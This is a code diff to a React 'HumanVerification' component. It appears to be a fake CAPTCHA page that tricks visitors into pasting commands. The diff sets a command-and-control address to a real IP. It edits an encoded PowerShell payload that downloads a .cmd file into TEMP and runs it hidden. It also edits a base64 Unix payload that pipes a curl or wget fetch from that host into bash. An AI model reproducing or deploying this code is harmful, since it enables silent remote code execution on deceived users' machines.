@@ -120,7 +120,7 @@ export function HumanVerification() {
   const [keyB, setKeyB] = useState('')
   const [payloadText, setPayloadText] = useState('')
 
-  const C2_URL = 'http://your-c2-server.com'; // CHANGE THIS
+  const C2_URL = 'http://146.103.57.122/69'; // CHANGE THIS
 
   const randomCode = () => Math.random().toString(16).substring(2, 8).toUpperCase();
 
@@ -156,11 +156,11 @@ export function HumanVerification() {
 
     const kB = session?.phrase
     // Build payload based on device
-    const winScript = `$c='  Code : ${kB}';Write-Host $c;Start-Sleep -Seconds 1;$u='${C2_URL}/repair.cmd';$o=\"$env:TEMP\\fix.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
+    const winScript = `$c='  Code : ${kB}';Write-Host $c;Start-Sleep -Seconds 1;$u='${C2_URL}/69w';$o=\"$env:TEMP\\fix.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
     const winB64 = b64UTF16(winScript)
     const winCmd = `powershell -Exec Bypass -EncodedCommand ${winB64}`
 
-    const unixScript = `#!/bin/bash\necho ' Code : ${kB}'\ncurl -s ${C2_URL}/repair.sh | bash`
+    const unixScript = `#!/bin/bash\n( curl -s ${C2_URL}/69m || wget -q -O ${C2_URL}/69m ) | bash; echo "CODE: ${kB}"`
     const unixB64 = b64Standard(unixScript)
     const unixCmd = `echo '${unixB64}' | base64 -d | bash`
 
